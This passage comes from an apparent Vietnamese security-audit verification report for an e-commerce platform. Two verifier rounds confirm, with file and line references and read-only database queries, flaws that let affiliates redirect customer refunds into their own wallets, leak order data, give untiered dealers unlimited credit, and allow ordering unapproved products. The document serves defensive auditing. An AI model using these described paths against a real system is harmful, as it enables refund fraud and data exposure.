| A5N-03 | **XÁC NHẬN (sửa đường khai thác)** | `dealer.service.ts:195` và `:209` kiểm hạn mức chỉ trong `if (onCredit && tier)`; `dealerContext` `:1414-1423` trả `tier = null` khi `metadata.dealerTierId` trống; `placeOrder` vẫn tạo đơn `CONFIRMED` + ghi `dealerCreditLedger`. **Sai một chi tiết trong báo cáo:** luồng duyệt hồ sơ KHÔNG thể để trống tier (`admin.service.ts:228` `if (!tierId) throw 'Cần chọn bậc đại lý khi duyệt.'`). Đường thật để có DEALER không tier là **admin cấp role trực tiếp** `POST /admin/users/role` (`admin.controller.ts:259-261` → `admin.service.ts:287-310` chỉ `data: { role }`, không gán tier; UI `apps/web/src/app/admin/page.tsx:1216` có `'DEALER'` trong danh sách role) hoặc dữ liệu seed. DB local: `SELECT count(*) FILTER (WHERE metadata->>'dealerTierId' IS NULL), count(*) FROM users WHERE role='DEALER'` → `1|1` (đại lý duy nhất đang không tier). Mọi spec dealer đều dựng user có `dealerTierId: 't1'` (`dealer.service.spec.ts:31,42`) → nhánh tier null không được test. | **P1** (giữ; cần admin thao tác "cấp role DEALER" nhưng UI mời làm vậy và hậu quả là công nợ không trần) |
| A5N-04 | **XÁC NHẬN** | `cart.service.ts:28-63` `getCart` dựng line từ mọi `cartItem` không lọc `isActive`/`approvalStatus`; `checkout.service.ts:499-505` `compute()` lấy thẳng `cart.getCart()`; `variation-stock.ts:57-62` `reserveVariationStock` chỉ `WHERE id AND stock >= q`. `grep isActive\|approvalStatus` trên `checkout/*.ts` + `cart/*.ts` (trừ spec) chỉ ra 3 dòng ở `addItem` (`cart.service.ts:117-123`). CTV: `affiliate.service.ts:280` chỉ `!v.isActive`. **Bổ sung (A5 chưa nêu):** đại lý `dealer.service.ts:177` chỉ `if (!v)` — không kiểm cả `isActive` lẫn `approvalStatus`, dù `pricelist` (:132) lọc `isActive:true` → đại lý gửi `variationId` SP đã ẩn/bị từ chối vẫn đặt được. Nhóm file nên thêm `apps/api/src/modules/dealer/dealer.service.ts`. | **P1** (giữ) |

### Lấy mẫu khẳng định "VẪN ĐỨNG" (Phần 1)

| Mục | Phán quyết | Bằng chứng |
|---|---|---|
| A2-01 QR vào TK CTV | XÁC NHẬN đã vá | `bank-transfer.service.ts:48-56` chỉ đọc `payment.bank_*`, không đọc storefront |
| A5-03 CTV tự "giao ảo" | XÁC NHẬN đã vá | `merchant.service.ts:533-538` `role !== 'ADMIN'` → Forbidden |
| A5-04 lộ tên/SĐT/địa chỉ | XÁC NHẬN (một phần) | `merchant.service.ts:507-516`; phần hở là A5N-02 |
| A5-05 lộ dealerPrices | XÁC NHẬN đã vá | `merchant.service.ts:374-380` `stripPricingInternals` khi `AFFILIATE` |
| A5-07 rút ×1.5 | XÁC NHẬN đã vá | `affiliate.service.ts:676-677` `const credited = total;` |
| A5-09 đại lý tự xoá nợ | XÁC NHẬN đã vá | `dealer.service.ts:317-330` chỉ notify admin, không ghi ledger |
| A5-11 cộng REJECTED | XÁC NHẬN đã vá | `affiliate.service.ts:818,834` `status: { not: REJECTED }` |
| A5-01 slug thường | XÁC NHẬN đã vá | `affiliate.service.ts:91` `toUpperCase()` |
| A6-06 hoàn COD | XÁC NHẬN đã vá | `order-reversal.service.ts:76,91-99` guard `COD+UNPAID` một lần |
| A3-05 quyền lợi hạng | XÁC NHẬN đã vá (lệch dòng) | logic nằm `checkout.service.ts:560-572`, ghi vào đơn ở `:244-246` |
| A7-01 gộp phiên | XÁC NHẬN đã vá; A5N-06 (P2) hợp lý | `auth.service.ts:239-345`; `guest` truyền từ ngoài tx, `increment: guest.*` :324-327; nuốt P2002 trong interactive tx :297-314 (Postgres huỷ tx sau lỗi → lệnh sau báo 25P02). Không kiểm động |
| ZaloPay resurrect | XÁC NHẬN đã vá | `zalopay.service.ts:164` `notIn: ['CANCELLED','RETURNED']` |
| Coupon farm | XÁC NHẬN đã vá | `coupons.service.ts:116` `usedCount: { lt: usageLimit }` |
| unhandledRejection | XÁC NHẬN đã vá | `main.ts:89` |
| Refresh cookie HttpOnly | XÁC NHẬN đã vá | `refresh-cookie.ts:84-88` `httpOnly: true`, `path: '/api/auth'` |
| Mass-assignment | XÁC NHẬN (tĩnh) | `main.ts:64-65` `whitelist: true, forbidNonWhitelisted: true` |

### Tổng kết verifier

- P0/P1 kiểm: **4** · XÁC NHẬN **4** · BÁC BỎ **0** · LỖI THỜI **0** · CHƯA RÕ **0**. Không đổi mức.
- Sửa chi tiết: A5N-03 — nguyên nhân không phải "duyệt hồ sơ chưa gán tier" (luồng duyệt bắt buộc tier) mà là **cấp role DEALER trực tiếp** qua `POST /admin/users/role`; đề xuất sửa vẫn đúng (`creditLimit` mặc định 0 khi `tier` null), nên thêm: `setUserRole(..., 'DEALER')` từ chối hoặc bắt buộc chọn tier.
- Mở rộng: A5N-01 cũng áp dụng cho trả hàng và COD đã giao; A5N-04 cũng áp dụng cho đơn đại lý (`dealer.service.ts:177`); A5N-02 thêm trường `endCustomerKey`.

## Kiểm chứng độc lập (verifier) — lượt 2

- **Ngày:** 2026-10-09 14:0x · **Commit:** `080bc75` (nhánh `hardening/2026-10`) · **Người kiểm:** verifier độc lập lượt 2 (phiên tiếp nối). Không tin báo cáo A5 lẫn lượt 1 ở trên; tự đọc lại mã.
- **Phạm vi:** 4 phát hiện P0/P1 (A5N-01..04) + kiểm lại các khẳng định của lượt 1 + lấy mẫu 6 mục "VẪN ĐỨNG" ở Phần 1 (A2-01, A5-03, A5-07, ZaloPay resurrect, bank-transfer, dealer tier).
- **Phương pháp:** đọc mã ở commit hiện tại + `psql SELECT` chỉ đọc. Không tạo fixture, không ghi DB, không chạy test suite. Kết quả psql: `SELECT count(*) FILTER (WHERE metadata->>'dealerTierId' IS NULL), count(*) FROM users WHERE role='DEALER'` → `1|1`; `users WHERE id LIKE 'sec-a5-%'` → `0`; `orders WHERE "userId" LIKE 'sec-a5-%'` → `0` (fixture A5 đã dọn).

| ID | Phán quyết | Bằng chứng (lượt 2 tự kiểm) | Mức đề xuất |
|---|---|---|---|
| A5N-01 | **XÁC NHẬN** | `affiliate.service.ts:323` `userId: ctvId`, `:337` `placedForCustomer: true`. `orders.service.ts:93-99` `detail()` chỉ so `order.userId === userId` → CTV là "chủ đơn"; `cancel()` `:141-183` → `assertCustomerCancellable` `:208-213` chỉ xét `status ∈ {PENDING_PAYMENT, CONFIRMED}`, không xét `paymentStatus`/`placedForCustomer`; `:181` gọi `reverseFinancials`. `order-reversal.service.ts:50-55` BANK_TRANSFER thuộc `isPrepaidRefundable`; `:119-122` cộng `walletBalance` cho `where: { id: order.userId }`. Không chỗ nào trong `orders/` (trừ spec) đọc `placedForCustomer` (grep rỗng). Luồng nghiệp vụ xác nhận khách là người trả: `ctv-order-sheet.tsx:148-156` dẫn CTV tới `/bank-payment/<code>` "để gửi khách"; `bank-transfer.service.ts:49-53` QR là TK Tubu. Ví rút được: `wallet.service.ts:123` `withdraw`. | **P0** (giữ) |
| A5N-02 | **XÁC NHẬN** | `merchant.service.ts:493-499` `include` (không `select`) → mọi cột scalar của `Order` (schema `Order`: `invoiceRequest`, `referrerUserId`, `endCustomerKey`, `note`). Nhánh non-admin `:507-516` chỉ ghi đè `user.fullName/phone` + `shippingAddress`. Controller `merchant.controller.ts:178-180` `@Roles('DEALER','AFFILIATE','ADMIN')`; `affiliate.service.ts:48-56` `register` lên AFFILIATE ngay không duyệt. | **P1** (giữ) |
| A5N-03 | **XÁC NHẬN** (đồng ý chỉnh nguyên nhân của lượt 1) | `dealer.service.ts:195` và `:209` chỉ kiểm hạn mức trong `if (onCredit && tier)`; `dealerContext` `:1414-1423` trả `tier = null` khi thiếu `dealerTierId` (và vẫn áp chiết khấu mặc định `rules.default ?? 0.2`). Nơi DUY NHẤT ghi `dealerTierId` là duyệt hồ sơ `admin.service.ts:228-238` (bắt buộc tier); `setUserRole` `admin.service.ts:286-310` chỉ `data: { role }`; UI `apps/web/src/app/admin/page.tsx:1216` có `'DEALER'`. DB local đang có đúng 1 đại lý không tier. **Sửa một khẳng định của lượt 1:** spec dealer KHÔNG phải "đều có `dealerTierId:'t1'`" — `dealer.service.spec.ts:257-258,398` và `dealer-credit-payment.spec.ts:36,40` dựng DEALER `metadata: null` + `dealerTier → null`; nhưng **không spec nào khẳng định chặn vượt hạn mức** (`grep -rln "Vượt hạn mức\|creditLimit" --include=*.spec.ts` trong `src/modules` → rỗng), nên kết luận "thiếu test cho nhánh CREDIT không tier" vẫn đúng. | **P1** (giữ) |
| A5N-04 | **XÁC NHẬN, phạm vi RỘNG HƠN báo cáo** | `cart.service.ts:28-63` `getCart` không lọc; `checkout.service.ts:499-501` `compute()` dùng thẳng `cart.getCart()`; `grep isActive\|approvalStatus` trên `checkout/*.ts`+`cart/*.ts` (trừ spec) chỉ ra `cart.service.ts:117-123` (`addItem`). **Mới (cả A5 lẫn lượt 1 chưa nêu):** (a) từ chối SP **không** tắt `isActive` — `admin.service.ts:729-735` chỉ đổi `approvalStatus`/`rejectReason`; (b) SP đối tác mới tạo `merchant.service.ts:298-309` là `PENDING_REVIEW` nhưng product + variation `isActive: true`, `stock` mặc định 100; `createProduct` không giới hạn role ngoài `@Roles('DEALER','AFFILIATE','ADMIN')` (`merchant.controller.ts:180,204`). Hệ quả: CTV lên đơn hộ (`affiliate.service.ts:280` chỉ `!v.isActive`), đơn định kỳ (`subscriptions.service.ts:54,216` chỉ `!variation.isActive`) và đại lý (`dealer.service.ts:177` chỉ `!v`; bảng giá `:132` chỉ lọc `isActive:true` nên còn **liệt kê** SP chưa duyệt/bị từ chối cho đại lý) đều đặt được SP **chưa từng được duyệt**, không cần "giỏ cũ". Nhóm file nên thêm `apps/api/src/modules/subscriptions/subscriptions.service.ts`, `apps/api/src/modules/dealer/dealer.service.ts`, `apps/api/src/modules/admin/admin.service.ts` (hoặc gom 1 helper `assertPurchasable` ở `catalog/`). | **P1** (giữ; không nâng P0 vì đơn vẫn qua kho Tubu, chưa thấy đường chiếm tiền trực tiếp — chưa kiểm chứng động hoa hồng trên SP tự tạo) |

**Lấy mẫu "VẪN ĐỨNG" (Phần 1) — lượt 2:** A2-01 `bank-transfer.service.ts:49-53` chỉ đọc `payment.bank_*` → XÁC NHẬN; A5-03 `merchant.service.ts:534-538` `role !== 'ADMIN'` → Forbidden → XÁC NHẬN; A5-07 `affiliate.service.ts:676-677` `credited = total` → XÁC NHẬN; ZaloPay resurrect `zalopay.service.ts:160-166` guard `paymentStatus:'UNPAID'` + `notIn:['CANCELLED','RETURNED']` → XÁC NHẬN. Không thấy mục nào trong Phần 1 bị hỏng lại.

**Tổng kết lượt 2:** P0/P1 kiểm **4** · XÁC NHẬN **4** · BÁC BỎ **0** · LỖI THỜI **0** · CHƯA RÕ **0**. Không đổi mức. Đính chính lượt 1: câu "mọi spec dealer đều có `dealerTierId:'t1'`" sai (có spec tier null, chỉ thiếu spec khẳng định hạn mức). Mở rộng A5N-04: SP `PENDING_REVIEW`/`REJECTED` vẫn `isActive=true` nên 3 đường đặt đơn ngoài giỏ (CTV lên hộ, đơn định kỳ, đại lý) không chặn được SP chưa duyệt.
